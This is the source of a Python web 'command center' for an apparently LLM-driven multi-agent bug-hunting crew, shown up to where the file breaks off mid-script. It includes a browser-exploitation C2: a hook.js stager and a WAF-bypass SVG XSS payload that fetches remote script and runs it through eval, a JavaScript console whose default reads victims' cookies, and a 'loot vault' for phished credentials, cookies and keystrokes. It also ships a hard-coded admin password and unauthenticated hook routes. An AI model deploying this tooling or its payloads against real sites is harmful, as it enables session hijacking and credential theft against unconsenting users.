"""Live `#basement-ops` Web Command Center (`web/warroom_ui.py`).

Features:
  - RFC 7617 HTTP Basic Authentication enabled by default (`admin:bugsBounty`), constant-time verified via `secrets.compare_digest`.
  - Victim hook routes (`/beef/*` and `/oob/*`) intentionally unauthenticated so hooked XSS victim browsers connect seamlessly without admin credentials, using strictly relative/same-origin paths (works locally AND over Arena HTTPS preview tunnels!).
  - 4 Full Real-Time Workspaces:
      1. `#basement-ops` Group Chat & Crew Banter + Live Side Feed
      2. Live Per-Agent Stats, `.bin/` Process Matrix & `PAYLOAD_MUTEX` WAF Board
      3. Interactive BeEF Browser Exploitation C2 (10 Attack Modules, Custom JS Console, Live Hooked Victim Sandbox, Loot Vault & OOB Listener)
      4. `RAZOR`-Verified Advisories, `curl`/Python PoCs, Binned False Positives, `CHAINSAW` Kill Chains & 22 `.bin/` Arsenal Table
"""
import base64
import json
import os
import re
import secrets
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from core.config import CFG, configure_api_key
from core.llm import get_llm
from tools.beef import DEMO_VICTIM_HTML, get_beef_server
from tools.oob import get_oob_manager
from tools.registry import ToolRegistry
from agents.crew import CREW_BUS
from agents.warroom import WarRoomSession

HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>bugsBounty // #basement-ops Command Center</title>
<style>
  :root {
    --bg: #06090e;
    --panel: #0c1119;
    --panel2: #121a26;
    --panel3: #182233;
    --border: #1f2d42;
    --fg: #e6eef8;
    --muted: #8496b0;
    --cyan: #28d7ff;
    --red: #ff4769;
    --green: #2be89a;
    --yellow: #ffd166;
    --magenta: #c77dff;
    --orange: #ff9248;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0; background: var(--bg); color: var(--fg);
    font-family: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
    height: 100vh; display: flex; flex-direction: column; overflow: hidden;
  }
  header {
    padding: 9px 15px; background: var(--panel); border-bottom: 1px solid var(--border);
    display: flex; align-items: center; justify-content: space-between; gap: 10px; flex-wrap: wrap;
  }
  .brand { display: flex; align-items: center; gap: 9px; font-weight: 800; font-size: 14px; }
  .tag { background: #142438; color: var(--cyan); border: 1px solid #255075; padding: 2px 7px; border-radius: 4px; font-size: 10.5px; }
  .kpis { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; font-size: 11px; color: var(--muted); }
  .kpis span b { color: var(--fg); }
  .job-pill {
    display: none; align-items: center; gap: 6px; padding: 3px 9px; border-radius: 99px;
    background: #1b2814; border: 1px solid var(--yellow); color: var(--yellow); font-size: 10.5px; font-weight: 700;
  }
  .job-pill.live { display: inline-flex; }
  .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); display: inline-block; }
  .dot.pulse { animation: pulse 1s infinite alternate; background: var(--yellow); }
  @keyframes pulse { from { opacity: .35; transform: scale(.85); } to { opacity: 1; transform: scale(1.25); } }

  .target-bar { display: flex; gap: 6px; align-items: center; flex: 1; min-width: 340px; max-width: 690px; }
  input, select, textarea {
    background: #06080d; border: 1px solid var(--border); color: var(--fg);
    padding: 7px 10px; border-radius: 6px; font-family: inherit; font-size: 12px;
  }
  input:focus, textarea:focus, select:focus { outline: none; border-color: var(--cyan); }
  .target-bar input { flex: 1; }
  button {
    background: var(--panel2); color: var(--fg); border: 1px solid var(--border);
    padding: 7px 11px; border-radius: 6px; font-family: inherit; font-size: 11.5px; cursor: pointer;
    transition: all .12s ease; font-weight: 700; white-space: nowrap;
  }
  button:hover:not(:disabled) { border-color: var(--cyan); color: #fff; background: var(--panel3); }
  button:disabled { opacity: .45; cursor: not-allowed; }
  button.primary { background: #10324a; border-color: var(--cyan); color: var(--cyan); }
  button.danger { background: #3b1322; border-color: var(--red); color: #ff9ebb; }
  button.success { background: #0f3628; border-color: var(--green); color: var(--green); }
  button.warn { background: #38290d; border-color: var(--yellow); color: var(--yellow); }

  nav.nav-views {
    display: flex; align-items: center; justify-content: space-between; gap: 6px;
    background: #090d14; border-bottom: 1px solid var(--border); padding: 0 14px;
  }
  .view-tabs { display: flex; gap: 4px; overflow-x: auto; }
  .view-tabs button {
    border: none; border-bottom: 2px solid transparent; border-radius: 0; background: transparent;
    padding: 9px 13px; font-size: 11.5px; color: var(--muted);
  }
  .view-tabs button.active { color: var(--cyan); border-bottom-color: var(--cyan); background: #0e1724; }
  .badge-cnt { background: #1a2639; color: var(--fg); padding: 1px 6px; border-radius: 99px; font-size: 10px; margin-left: 5px; }
  .badge-cnt.green { background: #104531; color: var(--green); }
  .badge-cnt.red { background: #4d1626; color: #ff99ac; }

  .workspace { display: none; flex: 1; min-height: 0; }
  .workspace.active { display: grid; }
  #view-chat.active { grid-template-columns: 285px 1fr 390px; }
  #view-ops.active { grid-template-rows: auto 1fr; grid-template-columns: 1fr; overflow-y: auto; display: flex; flex-direction: column; }
  #view-beef.active { grid-template-columns: 320px 1fr 410px; }
  #view-findings.active { grid-template-columns: 350px 1fr; }

  .col { display: flex; flex-direction: column; min-height: 0; border-right: 1px solid var(--border); }
  .col:last-child { border-right: none; }
  .pane-head {
    padding: 8px 12px; font-size: 10.5px; text-transform: uppercase; letter-spacing: .9px;
    color: var(--muted); border-bottom: 1px solid var(--border); background: var(--panel);
    display: flex; justify-content: space-between; align-items: center; gap: 8px;
  }
  .scroll { flex: 1; overflow-y: auto; padding: 11px; }

  /* Crew Cards with Live Stats */
  .crew-card {
    padding: 9px 10px; border: 1px solid var(--border); border-radius: 7px; margin-bottom: 8px;
    background: var(--panel); cursor: pointer; transition: all .14s;
  }
  .crew-card:hover { border-color: #365073; }
  .crew-card.active { border-color: var(--cyan); background: #101e2e; }
  .crew-card.running { border-color: var(--yellow); box-shadow: 0 0 14px rgba(255,209,102,.15); }
  .state-chip { font-size: 9.5px; padding: 1px 6px; border-radius: 4px; font-weight: 800; background: #1a2436; color: var(--muted); }
  .state-chip.RUNNING { background: #47350e; color: var(--yellow); }
  .state-chip.DONE { background: #103c2b; color: var(--green); }
  .state-chip.ERROR { background: #4a1525; color: #ff8fa3; }
  .mini-stats {
    display: grid; grid-template-columns: repeat(4, 1fr); gap: 4px; margin-top: 7px;
    padding-top: 6px; border-top: 1px dashed #1c293d; font-size: 9.8px; color: var(--muted);
  }
  .mini-stats b { display: block; color: var(--fg); font-size: 11px; }
  .task-line { font-size: 10px; color: #9ec5ea; margin-top: 5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

  .actions-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; padding: 9px 10px; border-top: 1px solid var(--border); background: var(--panel); }

  /* Chat Messages */
  .msg {
    padding: 9px 11px; border-radius: 7px; background: var(--panel); border-left: 3px solid #2b3d57;
    margin-bottom: 8px; font-size: 12px; line-height: 1.48; word-break: break-word;
  }
  .msg.cheer { border-left-color: var(--green); background: #0a2019; }
  .msg.browneye { border-left-color: var(--red); background: #240f17; }
  .msg.handoff { border-left-color: var(--magenta); background: #181126; }
  .msg.audit { border-left-color: var(--yellow); background: #211b0c; }
  .msg.waf { border-left-color: var(--orange); background: #24160c; }
  .msg.operator { border-left-color: var(--cyan); background: #0e1d2c; }
  .msg-head { display: flex; gap: 7px; align-items: center; margin-bottom: 4px; font-size: 10.5px; flex-wrap: wrap; }
  .badge { padding: 1px 6px; border-radius: 4px; font-size: 9px; font-weight: 800; text-transform: uppercase; background: #1c283b; color: var(--muted); }
  .quick-bar {
    display: flex; gap: 5px; padding: 6px 10px; background: #090d14; border-top: 1px solid var(--border); overflow-x: auto;
  }
  .quick-bar button { padding: 4px 8px; font-size: 10.5px; font-weight: 600; }
  .composer {
    padding: 9px 10px; background: var(--panel); border-top: 1px solid var(--border);
    display: flex; gap: 7px; align-items: center;
  }
  .composer input { flex: 1; padding: 8px 11px; font-size: 12.5px; }

  /* Wire Events & Ops Matrix */
  .ev-row {
    font-size: 11px; padding: 5px 8px; border-bottom: 1px solid #131c29; display: flex; gap: 8px; align-items: baseline;
  }
  .ev-row.warn { background: rgba(255,209,102,.05); }
  .ev-row.error { background: rgba(255,71,105,.08); }
  .ev-row.success { background: rgba(43,232,154,.06); }
  .ev-cat { font-size: 9px; padding: 1px 5px; border-radius: 3px; background: #192538; color: var(--cyan); min-width: 54px; text-align: center; text-transform: uppercase; font-weight: 700; }
  .ops-cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 12px; }
  .ops-card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 11px 13px; }
  .ops-mid { display: grid; grid-template-columns: 1.2fr 1fr; gap: 10px; padding: 0 12px 12px; }
  .ops-box { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; display: flex; flex-direction: column; max-height: 250px; }

  /* Findings & BeEF Cards */
  .tabs { display: flex; border-bottom: 1px solid var(--border); background: var(--panel); }
  .tabs button { flex: 1; border: none; border-radius: 0; border-bottom: 2px solid transparent; padding: 8px 4px; font-size: 10.5px; background: transparent; color: var(--muted); }
  .tabs button.active { border-bottom-color: var(--cyan); color: var(--cyan); }
  .finding { border: 1px solid var(--border); background: var(--panel); border-radius: 7px; padding: 9px 11px; margin-bottom: 8px; font-size: 11.5px; }
  .finding.critical { border-left: 3px solid var(--red); }
  .finding.high { border-left: 3px solid var(--yellow); }
  .finding.disproved { border-left: 3px solid #5c677d; opacity: .88; }
  pre.code {
    background: #05070b; border: 1px solid #1b2638; padding: 7px 9px; border-radius: 5px;
    overflow-x: auto; font-size: 10.5px; color: #9be7ff; margin: 6px 0 0; white-space: pre-wrap; word-break: break-all;
  }
  .mod-btn {
    width: 100%; text-align: left; margin-bottom: 6px; padding: 8px 10px; display: flex; flex-direction: column; gap: 2px;
  }
  .mod-btn small { color: var(--muted); font-weight: 400; font-size: 10px; white-space: normal; }
</style>
</head>
<body>
<header>
  <div class="brand">
    <span>bugsBounty</span>
    <span class="tag">#basement-ops</span>
    <span class="job-pill" id="jobPill"><span class="dot pulse"></span><span id="jobText">Running...</span></span>
  </div>
  <div class="kpis" id="kpiBar">
    <span>HTTP: <b id="kHttp">0</b></span>
    <span>.bin: <b id="kBin">0</b></span>
    <span>WAF Wins: <b id="kWaf" style="color:var(--green)">0</b></span>
    <span>BeEF Online: <b id="kBeef" style="color:var(--cyan)">0</b></span>
    <span>OOB Hits: <b id="kOob" style="color:var(--magenta)">0</b></span>
    <span>Verified: <b id="kVer" style="color:var(--green)">0</b></span>
    <span>Brown-Eyes: <b id="kBinFp" style="color:var(--red)">0</b></span>
  </div>
  <div class="target-bar">
    <input id="targetInput" placeholder="https://authorized-target.tld  (or Launch Lab ->)" />
    <button onclick="setTarget()">Target</button>
    <button class="success" onclick="sendCmd('/lab', '', true)">Launch Lab</button>
    <button class="danger" onclick="sendCmd('/autopilot', '', true)">⚡ 6-Agent Autopilot</button>
    <button class="primary" onclick="toggleKeyBar()">🔑 API Key</button>
  </div>
</header>

<div id="keyBar" style="display:none;padding:9px 15px;background:#0a101a;border-bottom:1px solid var(--border);gap:8px;align-items:center;flex-wrap:wrap">
  <span style="font-size:11.5px;color:var(--cyan);font-weight:700">LLM Config:</span>
  <select id="provSelect">
    <option value="groq">Groq Cloud (https://api.groq.com/openai/v1 — qwen/qwen3.8-27b)</option>
    <option value="ollama">Local Ollama (http://localhost:11434)</option>
    <option value="openai">OpenAI (https://api.openai.com/v1)</option>
    <option value="xai">xAI (https://api.x.ai/v1 — xai-...)</option>
  </select>
  <input id="apiKeyInput" type="password" placeholder="Paste Groq API key (gsk_...)" style="flex:1;min-width:230px" />
  <input id="modelInput" placeholder="Model (default: qwen/qwen3.8-27b)" style="width:240px" />
  <button class="success" onclick="saveLlmKey()">Save &amp; Activate</button>
  <span id="keyStatus" style="font-size:11px;color:var(--muted)"></span>
</div>

<nav class="nav-views">
  <div class="view-tabs">
    <button id="tab-chat" class="active" onclick="switchView('chat')">💬 #basement-ops Group Chat &amp; War-Room</button>
    <button id="tab-ops" onclick="switchView('ops')">📡 Live Agent Stats &amp; .bin Activity <span class="badge-cnt" id="navActiveCnt">0 active</span></button>
    <button id="tab-beef" onclick="switchView('beef')">🐂 BeEF Hook C2 &amp; OOB Panel <span class="badge-cnt green" id="navBeefCnt">0 hooked</span></button>
    <button id="tab-findings" onclick="switchView('findings')">🏆 Advisories, PoCs, Chains &amp; 22 Tools <span class="badge-cnt green" id="navVerCnt">0</span></button>
  </div>
  <div style="font-size:10.5px;color:var(--muted)">LLM: <b id="llmBadge" style="color:var(--cyan)">...</b></div>
</nav>

<!-- ==================== WORKSPACE 1: GROUP CHAT & WAR-ROOM ==================== -->
<div class="workspace active" id="view-chat">
  <div class="col">
    <div class="pane-head"><span>6-Agent Crew &amp; Live Telemetry</span><span>Click to @Tag</span></div>
    <div class="scroll" id="crewList"></div>
    <div class="actions-grid">
      <button onclick="sendCmd('/recon', '', true)">1. GHOST Recon</button>
      <button onclick="sendCmd('/hunt', '', true)">2. BLITZ Hunt</button>
      <button onclick="sendCmd('/escalate', '', true)">3. SWITCH Escalate</button>
      <button onclick="sendCmd('/critic', '', true)">4. RAZOR Critic</button>
      <button onclick="sendCmd('/chains', '', true)">5. CHAINSAW</button>
      <button onclick="sendCmd('/report', '', true)">6. FIXER Report</button>
    </div>
  </div>

  <div class="col">
    <div class="pane-head">
      <span>#basement-ops Group Chat — Banter, Handoffs, Cheers &amp; RAZOR Brown-Eyes</span>
      <span id="chatTyping" style="color:var(--yellow)"></span>
    </div>
    <div class="scroll" id="chatFeed"></div>
    <div class="quick-bar">
      <button onclick="sendCmd('Oi crew! Sound off with station status and roast whoever is slacking!', '', true)">🍻 Crew Roll-Call &amp; Banter</button>
      <button onclick="sendCmd('RAZOR who copped the worst brown-eye today and why?', '', true)">🍑 Brown-Eye Report</button>
      <button onclick="sendCmd('What is our WAF & tamper strategy on this target boys?', '', true)">🛡️ WAF Strategy</button>
      <button onclick="openVictimAndSwitch()">🪝 Hook Demo Victim Browser</button>
      <button onclick="sendCmd('/status', '', true)">📊 Status Summary</button>
    </div>
    <form class="composer" onsubmit="onSubmitChat(event)">
      <select id="speakerSelect">
        <option value="">@CREW (Group Banter)</option>
        <option value="GHOST">@GHOST (Recon)</option>
        <option value="BLITZ">@BLITZ (Hunter)</option>
        <option value="SWITCH">@SWITCH (Escalator)</option>
        <option value="RAZOR">@RAZOR (Critic)</option>
        <option value="CHAINSAW">@CHAINSAW (Chains)</option>
        <option value="FIXER">@FIXER (Reporter)</option>
      </select>
      <input id="chatInput" placeholder="Banter with the whole crew, @mention an operator, drop a URL, or run /autopilot..." autocomplete="off" />
      <button class="primary" type="submit">Send</button>
    </form>
  </div>

  <div class="col">
    <div class="tabs">
      <button id="rtab-wire" class="active" onclick="setRightTab('wire')">⚡ Live Feed</button>
      <button id="rtab-ver" onclick="setRightTab('ver')">✅ Bugs (<span id="cntV">0</span>)</button>
      <button id="rtab-dis" onclick="setRightTab('dis')">🍑 Binned (<span id="cntD">0</span>)</button>
      <button id="rtab-chn" onclick="setRightTab('chn')">⛓️ Chains (<span id="cntC">0</span>)</button>
    </div>
    <div class="scroll" id="rightPane"></div>
  </div>
</div>

<!-- ==================== WORKSPACE 2: LIVE AGENT STATS & PROCESS MATRIX ==================== -->
<div class="workspace" id="view-ops">
  <div class="ops-cards" id="opsAgentGrid"></div>
  <div class="ops-mid">
    <div class="ops-box">
      <div class="pane-head"><span>Active &amp; Recent `.bin/` Subprocess Executions</span><span id="procSummary"></span></div>
      <div class="scroll" id="procPane" style="padding:8px"></div>
    </div>
    <div class="ops-box">
      <div class="pane-head"><span>`PAYLOAD_MUTEX` WAF Evasion &amp; Tamper State</span></div>
      <div class="scroll" id="wafPane" style="padding:10px;font-size:11.5px"></div>
    </div>
  </div>
  <div style="flex:1;min-height:260px;margin:0 12px 12px;background:var(--panel);border:1px solid var(--border);border-radius:8px;display:flex;flex-direction:column">
    <div class="pane-head">
      <span>Real-Time HTTP Wire, `.bin/` Binary, WAF &amp; Critic Telemetry Stream</span>
      <div style="display:flex;gap:5px">
        <button onclick="setWireFilter('ALL')" id="wf-ALL" class="primary" style="padding:3px 8px;font-size:10px">ALL</button>
        <button onclick="setWireFilter('process')" id="wf-process" style="padding:3px 8px;font-size:10px">.BIN PROC</button>
        <button onclick="setWireFilter('http')" id="wf-http" style="padding:3px 8px;font-size:10px">HTTP WIRE</button>
        <button onclick="setWireFilter('waf')" id="wf-waf" style="padding:3px 8px;font-size:10px">WAF MUTEX</button>
        <button onclick="setWireFilter('critic')" id="wf-critic" style="padding:3px 8px;font-size:10px">RAZOR</button>
        <button onclick="setWireFilter('c2')" id="wf-c2" style="padding:3px 8px;font-size:10px">BeEF / OOB</button>
      </div>
    </div>
    <div class="scroll" id="opsWirePane" style="padding:0"></div>
  </div>
</div>

<!-- ==================== WORKSPACE 3: BeEF BROWSER C2 & OOB WORKBENCH ==================== -->
<div class="workspace" id="view-beef">
  <div class="col">
    <div class="pane-head">
      <span>Hooked Browsers &amp; Attack Modules</span>
      <button class="success" style="padding:3px 8px;font-size:10px" onclick="spawnDemoVictim()">🪝 Hook Demo Victim</button>
    </div>
    <div class="scroll">
      <div style="font-size:10.5px;color:var(--muted);margin-bottom:6px">HOOKED ZOMBIE BROWSERS (click to select target):</div>
      <div id="beefSessions"></div>
      <div style="margin:12px 0 6px;padding-top:10px;border-top:1px solid var(--border);font-size:10.5px;color:var(--cyan);font-weight:700">
        1-CLICK EXPLOITATION MODULES:
      </div>
      <div id="beefModules"></div>
    </div>
  </div>

  <div class="col">
    <div class="pane-head">
      <span>BeEF C2 JS Console, Execution Output, Loot Vault &amp; OOB Listener</span>
      <button class="warn" style="padding:3px 8px;font-size:10px" onclick="mintAndTestOob()">📡 Mint + Test OOB Callback</button>
    </div>
    <div class="scroll">
      <div class="finding" style="border-left:3px solid var(--cyan)">
        <div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap">
          <strong>Live Browser Hook Stagers (`hook.js`)</strong>
          <div style="display:flex;gap:5px">
            <button onclick="copyHookUrl()" style="padding:3px 8px;font-size:10px">Copy hook.js URL</button>
            <button onclick="copySvgStager()" style="padding:3px 8px;font-size:10px">Copy WAF-Bypass SVG Stager</button>
          </div>
        </div>
        <pre class="code" id="hookUrlBox"></pre>
      </div>

      <div class="finding">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
          <strong>Execute Custom JavaScript on <span id="targetSidLabel" style="color:var(--cyan)">* ALL HOOKED BROWSERS</span></strong>
          <button class="primary" onclick="runCustomBeefJs()" style="padding:4px 10px">⚡ Execute JS</button>
        </div>
        <textarea id="customJsBox" rows="3" style="width:100%">({title: document.title, cookies: document.cookie, userAgent: navigator.userAgent})</textarea>
      </div>

      <div style="font-size:11px;font-weight:700;color:var(--green);margin:10px 0 6px">💎 CAPTURED LOOT VAULT (Phished Creds, Cookies, DOM Tokens &amp; Keystrokes):</div>
      <div id="beefLootPane"></div>

      <div style="font-size:11px;font-weight:700;color:var(--cyan);margin:12px 0 6px">📜 COMMAND EXECUTION RESULTS:</div>
      <div id="beefResultsPane"></div>

      <div style="font-size:11px;font-weight:700;color:var(--magenta);margin:12px 0 6px">📡 OUT-OF-BAND (`OOBManager` / `Interactsh`) CALLBACK HITS:</div>
      <div id="oobHitsPane"></div>
    </div>
  </div>

  <div class="col">
    <div class="pane-head">
      <span>Live Victim Browser Sandbox (`beef/victim`)</span>
      <div style="display:flex;gap:5px">
        <button onclick="spawnDemoVictim()" style="padding:3px 7px;font-size:10px">Reload Victim</button>
        <a href="beef/victim" target="_blank" style="color:var(--cyan);font-size:10.5px;text-decoration:none;padding:3px 6px">Pop Out ↗</a>
      </div>
    </div>
    <iframe id="victimFrame" src="about:blank" style="flex:1;border:none;background:#0f172a;width:100%"></iframe>
  </div>
</div>

<!-- ==================== WORKSPACE 4: ADVISORIES, POCS, CHAINS & 22 TOOLS ==================== -->
<div class="workspace" id="view-findings">
  <div class="col">
    <div class="pane-head"><span>22 `.bin/` &amp; Built-In Arsenal Status</span></div>
    <div class="scroll" id="arsenalList"></div>
  </div>
  <div class="col">
    <div class="pane-head"><span>Full Verified Advisories, Reproducible `curl` PoCs, Attack Chains &amp; Binned False Positives</span></div>
    <div class="scroll" id="fullFindingsPane"></div>
  </div>
</div>

<script>
const COLORS = {
  GHOST: '#28d7ff', BLITZ: '#ff4769', SWITCH: '#c77dff',
  RAZOR: '#ffd166', CHAINSAW: '#2be89a', FIXER: '#5fa8ff', YOU: '#ffffff'
};

let state = null;
let toolsCache = [];
let activeView = 'chat';
let rightTab = 'wire';
let wireFilter = 'ALL';
let selectedSid = '*';
let lastTranscriptSig = '';

function esc(s) {
  return String(s ?? '').replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
}

async function api(url, opts = {}) {
  const res = await fetch(url, Object.assign({credentials: 'same-origin'}, opts));
  if (!res.ok) throw new Error('HTTP ' + res.status);
  return res.json();
}

function publicHookUrl() {
  const base = window.location.href.split('?')[0].split('#')[0].replace(/\/+$/, '');
  return base + '/beef/hook.js';
}

function switchView(v) {
  activeView = v;
  document.querySelectorAll('.workspace').forEach(el => el.classList.remove('active'));
  document.querySelectorAll('.view-tabs button').forEach(el => el.classList.remove('active'));
  document.getElementById('view-' + v).classList.add('active');
  document.getElementById('tab-' + v).classList.add('active');
  if (state) render();
}

function setRightTab(t) {
  rightTab = t;
  ['wire','ver','dis','chn'].forEach(k => document.getElementById('rtab-' + k).classList.toggle('active', k === t));
  if (state) renderRight();
}

function setWireFilter(f) {
  wireFilter = f;
  ['ALL','process','http','waf','critic','c2'].forEach(k => {
    const b = document.getElementById('wf-' + k);
    if (b) b.classList.toggle('primary', k === f);
  });
  if (state) renderOps();
}

function selectCrew(handle) {
  const sel = document.getElementById('speakerSelect');
  sel.value = (sel.value === handle ? '' : handle);
  document.getElementById('chatInput').focus();
  renderCrew();
}

function openVictimAndSwitch() {
  switchView('beef');
  spawnDemoVictim();
}

function spawnDemoVictim() {
  const fr = document.getElementById('victimFrame');
  fr.src = 'beef/victim?t=' + Date.now();
}

async function runBeefModule(modId, label, jsCode) {
  const fr = document.getElementById('victimFrame');
  if (!state?.beef?.sessions_list?.length && fr && fr.src === 'about:blank') {
    spawnDemoVictim();
    await new Promise(r => setTimeout(r, 900));
  }
  await api('api/beef/command', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({sid: selectedSid, module: modId, label, js: jsCode})
  });
  setTimeout(refreshState, 450);
  setTimeout(refreshState, 1350);
}

async function runCustomBeefJs() {
  const js = document.getElementById('customJsBox').value.trim();
  if (!js) return;
  await runBeefModule('custom_js', 'Custom JS eval()', js);
}

async function mintAndTestOob() {
  const out = await api('api/oob/test', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: '{}'});
  if (out.canary) await refreshState();
}

function copyHookUrl() {
  navigator.clipboard?.writeText(publicHookUrl());
}
function copySvgStager() {
  navigator.clipboard?.writeText(`"><svg/onload="fetch('${publicHookUrl()}').then(r=>r.text()).then(eval)">`);
}

function renderCrew() {
  const cur = document.getElementById('speakerSelect').value;
  document.getElementById('crewList').innerHTML = (state.crew || []).map(c => {
    const s = c.stats || {};
    const st = s.state || 'IDLE';
    return `
      <div class="crew-card ${cur === c.handle ? 'active' : ''} ${st === 'RUNNING' ? 'running' : ''}" onclick="selectCrew('${c.handle}')">
        <div style="display:flex;justify-content:space-between;align-items:center">
          <span style="color:${COLORS[c.handle] || '#fff'};font-weight:800;font-size:12.5px">@${c.handle}</span>
          <span class="state-chip ${st}">${esc(s.current_tool || st)}</span>
        </div>
        <div style="color:var(--muted);font-size:10px;margin-top:2px">${esc(c.role)}</div>
        <div class="task-line" title="${esc(s.current_task || '')}">${esc(s.current_task || 'Standing by')}</div>
        <div class="mini-stats">
          <div>HTTP<b>${s.http_requests || 0}</b></div>
          <div>.bin<b>${s.bin_runs || 0}</b></div>
          <div>WAF<b>${s.waf_bypasses || 0}/${s.waf_blocks || 0}</b></div>
          <div>Win/Bin<b>${(s.verified_wins || s.leads_found || s.escalations || 0)}/${s.browneyes || 0}</b></div>
        </div>
      </div>`;
  }).join('');
}

function renderChat() {
  const feed = document.getElementById('chatFeed');
  const msgs = state.transcript || [];
  const sig = msgs.length + ':' + (msgs.length ? msgs[msgs.length - 1].ts + msgs[msgs.length - 1].text : '');
  if (sig === lastTranscriptSig) return;
  const nearBottom = (feed.scrollHeight - feed.scrollTop - feed.clientHeight) < 140;
  lastTranscriptSig = sig;
  feed.innerHTML = msgs.map(m => {
    const col = COLORS[m.speaker] || '#e6eef8';
    const arrow = m.to ? `<span style="color:var(--muted)">→ ${esc(m.to)}</span>` : '';
    return `
      <div class="msg ${esc(m.kind || 'banter')}">
        <div class="msg-head">
          <strong style="color:${col}">${esc(m.speaker)}</strong>
          ${arrow}
          <span class="badge">${esc(m.kind || 'crew')}</span>
          <span style="margin-left:auto;color:var(--muted);font-size:9.5px">${new Date((m.ts || 0)*1000).toLocaleTimeString()}</span>
        </div>
        <div>${esc(m.text)}</div>
      </div>`;
  }).join('');
  if (nearBottom || msgs.length <= 6) feed.scrollTop = feed.scrollHeight;
}

function renderRight() {
  const pane = document.getElementById('rightPane');
  if (rightTab === 'wire') {
    const evs = [...((state.telemetry && state.telemetry.events) || [])].reverse().slice(0, 75);
    pane.innerHTML = evs.length ? evs.map(e => `
      <div class="ev-row ${esc(e.level)}">
        <span class="ev-cat">${esc(e.category)}</span>
        <div style="min-width:0;flex:1">
          <div><strong style="color:${COLORS[e.agent] || 'var(--cyan)'}">${esc(e.agent)}</strong> ${esc(e.title)}</div>
          ${e.detail ? `<div style="color:var(--muted);font-size:9.8px;overflow:hidden;text-overflow:ellipsis">${esc(e.detail)}</div>` : ''}
        </div>
      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No wire activity yet — click Launch Lab or 6-Agent Autopilot!</p>';
  } else if (rightTab === 'ver') {
    pane.innerHTML = (state.verified || []).length ? state.verified.map(f => `
      <div class="finding ${esc(f.severity)}">
        <div style="display:flex;justify-content:space-between">
          <strong style="color:var(--green)">[${esc((f.severity || '').toUpperCase())}] ${esc(f.type)}</strong>
          <span>CVSS ${esc(f.cvss_score || '')}</span>
        </div>
        <div style="color:var(--cyan);margin-top:3px;word-break:break-all">${esc(f.url)}</div>
        <div style="color:var(--muted);font-size:10.5px;margin-top:4px">${esc(f.evidence)}</div>
        ${f.curl_poc ? `<pre class="code">${esc(f.curl_poc)}</pre>` : ''}
      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No RAZOR-certified bugs yet.</p>';
  } else if (rightTab === 'dis') {
    pane.innerHTML = (state.disproved || []).length ? state.disproved.map(f => `
      <div class="finding disproved">
        <strong style="color:var(--red)">🍑 BINNED BY RAZOR :: ${esc(f.type)}</strong>
        <div style="color:var(--muted);margin-top:3px;word-break:break-all">${esc(f.url)}</div>
        <div style="color:#ffb3c1;font-size:10.5px;margin-top:4px">${esc((f.critic_notes || []).join(' | '))}</div>
      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No false-positive mirages binned yet.</p>';
  } else {
    pane.innerHTML = (state.chains || []).length ? state.chains.map(c => `
      <div class="finding critical">
        <strong style="color:var(--magenta)">⛓️ ${esc(c.title || c.name)}</strong>
        <div style="color:var(--yellow);font-size:10.5px;margin-top:3px">Impact: ${esc(c.impact || c.severity)}</div>
        <pre class="code">${esc((c.steps || []).join('\n→ '))}</pre>
      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No attack chains built yet.</p>';
  }
}

function renderOps() {
  if (activeView !== 'ops') return;
  const t = state.telemetry || {};
  document.getElementById('opsAgentGrid').innerHTML = (state.crew || []).map(c => {
    const s = c.stats || {};
    return `
      <div class="ops-card" style="border-top:3px solid ${COLORS[c.handle] || '#fff'}">
        <div style="display:flex;justify-content:space-between;align-items:center">
          <strong style="color:${COLORS[c.handle]};font-size:14px">${c.handle} — ${esc(c.role)}</strong>
          <span class="state-chip ${s.state || 'IDLE'}">${esc(s.state || 'IDLE')}</span>
        </div>
        <div style="margin-top:7px;font-size:11.5px;color:#bde0fe">Task: <b>${esc(s.current_task || 'Idle')}</b></div>
        <div style="margin-top:3px;font-size:11px;color:var(--yellow)">Active Tool: <code>${esc(s.current_tool || 'none')}</code></div>
        <div class="mini-stats" style="margin-top:9px">
          <div>HTTP Reqs<b>${s.http_requests || 0}</b></div>
          <div>.bin Runs<b>${s.bin_runs || 0}</b></div>
          <div>WAF Wins<b>${s.waf_bypasses || 0}</b></div>
          <div>Runtime<b>${Math.round(s.total_runtime_ms || 0)}ms</b></div>
        </div>
      </div>`;
  }).join('');

  const act = t.active_processes || [];
  const rec = t.recent_processes || [];
  document.getElementById('procSummary').textContent = `${act.length} running · ${rec.length} recent`;
  document.getElementById('procPane').innerHTML = [
    ...act.map(p => `<div class="ev-row warn"><span class="ev-cat">LIVE</span><div><b style="color:var(--yellow)">[${esc(p.agent)}]</b> <code>${esc(p.cmd)}</code> (${Math.round(p.elapsed_ms)}ms)</div></div>`),
    ...rec.map(p => `<div class="ev-row"><span class="ev-cat">${esc(p.status)}</span><div><b style="color:${COLORS[p.agent]||'var(--cyan)'}">[${esc(p.agent)}]</b> <code>${esc(p.cmd)}</code> <span style="color:var(--muted)">(${Math.round(p.duration_ms)}ms)</span></div></div>`)
  ].join('') || '<div style="padding:10px;color:var(--muted);font-size:11.5px">No `.bin/` subprocesses executed yet.</div>';

  const wm = state.waf_mutex || {};
  document.getElementById('wafPane').innerHTML = `<pre class="code">${esc(JSON.stringify(wm, null, 2))}</pre>`;

